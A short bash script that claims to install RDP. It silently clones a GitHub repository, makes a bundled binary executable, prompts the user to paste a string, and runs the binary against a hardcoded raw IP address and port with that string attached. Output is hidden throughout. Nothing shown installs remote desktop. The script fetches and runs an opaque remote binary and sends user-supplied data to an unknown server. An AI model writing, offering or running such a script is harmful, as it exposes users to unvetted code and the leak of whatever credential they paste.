#! /bin/bash
printf "Installing RDP Be Patience... " $1 >&2
{
git clone https://github.com/phucbmt/tech.git &> /dev/null
sudo chmod +x tech/m
} &> /dev/null &&
read -p "Paste Here: " CRP
./tech/m -P http://138.197.99.165:4545/"""$CRP""" &> log
